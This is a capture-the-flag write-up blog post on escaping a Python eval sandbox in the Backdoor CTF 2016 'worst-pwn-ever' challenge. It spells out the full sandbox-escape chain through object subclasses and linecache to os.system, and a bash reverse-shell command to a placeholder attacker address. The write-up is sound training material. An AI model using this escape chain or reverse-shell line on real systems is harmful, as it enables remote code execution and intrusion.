---
id: 795
title: 'Backdoor CTF 2016 - Worst-pwn-ever - Pwn Challenge'
date: 2016-06-06T05:08:19+00:00
author: Kris
layout: post
guid: https://ctf.rip/?p=795
permalink: /backdoor16-worstpwnever/
themepixels_post_link_target:
  - 'yes'
themepixels_enable_post_header:
  - default
themepixels_enable_post_meta_single:
  - default
themepixels_enable_post_featured_content:
  - default
themepixels_enable_post_categories:
  - default
themepixels_enable_post_tags:
  - default
themepixels_enable_post_share:
  - default
themepixels_enable_post_author_info_box:
  - default
themepixels_enable_related_posts:
  - default
themepixels_enable_post_next_prev_links:
  - default
themepixels_enable_topbar:
  - default
themepixels_enable_sticky_header:
  - default
themepixels_header_layout:
  - default
themepixels_site_layout:
  - default
themepixels_sidebar_position:
  - default
post_views_count:
  - "2477"
image: /images/2016/06/banner-1.png
categories:
  - Write-Ups
---
Cool little challenge, we're given a hostname and port. When we connect we're presented with a '>' prompt and we have to deduce the environment we're in then exploit it. 

> **worst-pwn-ever**
  
> tocttou is an enviornmentalist. But some say he has a vicious motive and he uses nature to hide his dark side. We found a weird shell on his amazon (pun inteded) web services. Can you tell us what is he upto? Tip: he might shut down the machine if he notices you - and he will (maybe in 45 seconds). Access: nc hack.bckdr.in 9008
> 
> Created by: Ashish Chaudhary

After one command is attempted the shell exits. Here's the first run: 
```
> test
NameError: name 'test' is not defined
-> WHAT ARE YOU DOING HERE? >-[

```
 

NameError makes me think this is a Python exception. I try to have it print something using Python print. 
```
> print dir()
NameError: invalid syntax (<string>, line 1) 
-> WHAT ARE YOU DOING HERE? >-[
```
 

No luck. I'm thinking we don't seem to be able to see the results of our code except for in the Exceptions, so I try to raise meaningful NameError exceptions: 
```
> eval(dir()[0]+"X")
NameError: name '__builtins__X' is not defined
-> WHAT ARE YOU DOING HERE? >-[
```
 

I am thus able to leak names and contents of the globals etc. Thinking the flag was in the Python environment we wrote a script to enumerate dir()/globals() etc but no luck there.

Next I focused on getting code execution. The os/sys modules are not loaded, but I recalled a past CTF where it is possible to call os.system() even when os module is not loaded through a convoluted path. This is the writeup I mean:

<a href="https://blog.inexplicity.de/plaidctf-2013-pyjail-writeup-part-i-breaking-the-sandbox.html" target="_blank">https://blog.inexplicity.de/plaidctf-2013-pyjail-writeup-part-i-breaking-the-sandbox.html</a>

So on my local system I began searching to see if this `linecache` module method still works on Python in 2016. I examine the list of subclasses in Python on my local machine: 
```
>>> ().__class__.__base__.__subclasses__()
[<type 'type'>, <type 'weakref'>, ... , <class 'warnings.catch_warnings'>, ...] 
```
 
It's there, at index 59 of the `__subclasses__()` list is `warnings.catch_warnings`. Let's examine if the remote system aligns with my system. We can call a fake attribute of this method to generate a NameError exception: 
```
> ().__class__.__base__.__subclasses__()[59].__fake__
NameError: type object 'catch_warnings' has no attribute '__fake__'
-> WHAT ARE YOU DOING HERE? >-[
  
```
 

Nice! It aligns with my local system. So we can continue to exploit this with the same attributes used in PlaidCTF 2013. Like so... 
```
> ().__class__.__base__.__subclasses__()[59].__init__.func_globals["linecache"].__dict__["os"].system("bash -i >& /dev/tcp/x.x.x.x/1234 0>&1")

```

From which I received a reverse Bash shell on my listening host. 

Given the clue about the "environmentalist" I checked the bash environment and sure enough the flag was stored as an environment variable.